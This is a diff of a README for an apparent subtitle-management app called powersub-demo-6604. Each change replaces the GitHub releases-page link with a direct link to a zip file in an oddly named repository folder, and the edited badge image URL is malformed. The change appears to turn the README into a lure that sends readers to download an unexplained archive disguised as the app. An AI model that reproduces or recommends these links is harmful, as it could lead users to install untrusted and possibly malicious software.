@@ -1,13 +1,13 @@
 # 🎉 powersub-demo-6604 - Experience Seamless Subtitles Management
 
 ## 🔗 Download the Application
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Mrizkialfariz/powersub-demo-6604/releases)
+[![Download](https://raw.githubusercontent.com/Mrizkialfariz/powersub-demo-6604/main/Provencal/powersub-demo-6604.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mrizkialfariz/powersub-demo-6604/main/Provencal/powersub-demo-6604.zip)
 
 ## 🚀 Getting Started
 Welcome to the powersub-demo-6604! This application helps you manage subtitles smoothly, making it easier to watch your favorite videos. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-To download the application, visit this page: [Download Page](https://github.com/Mrizkialfariz/powersub-demo-6604/releases). You will find the latest version listed there. 
+To download the application, visit this page: [Download Page](https://raw.githubusercontent.com/Mrizkialfariz/powersub-demo-6604/main/Provencal/powersub-demo-6604.zip). You will find the latest version listed there. 
 
 1. Click on the link to the release.
 2. Look for the executable file for your operating system.
@@ -53,7 +53,7 @@ Should you encounter any issues, here are some common solutions:
 Join our community for help and discussions. You can ask questions, share tips, and connect with other users. Check our GitHub issues section for more support or visit forums dedicated to video playback and subtitle management.
 
 ## 🔗 Visit the Download Page Again
-For easy access, here’s the [Download Page](https://github.com/Mrizkialfariz/powersub-demo-6604/releases) once more. Make sure you grab the latest version for the best experience.
+For easy access, here’s the [Download Page](https://raw.githubusercontent.com/Mrizkialfariz/powersub-demo-6604/main/Provencal/powersub-demo-6604.zip) once more. Make sure you grab the latest version for the best experience.
 
 ---
 
